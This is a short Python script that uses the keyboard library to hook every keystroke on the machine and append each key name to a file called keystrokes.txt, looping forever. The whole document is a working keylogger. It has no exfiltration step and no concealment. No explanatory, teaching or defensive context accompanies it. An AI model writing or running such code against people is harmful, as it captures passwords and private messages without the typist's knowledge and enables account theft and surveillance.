import keyboard
import os

def log_keystrokes(e):
    with open("keystrokes.txt", "a") as f:
        f.write(e.name + "\n")

keyboard.hook(log_keystrokes)

while True:
    pass
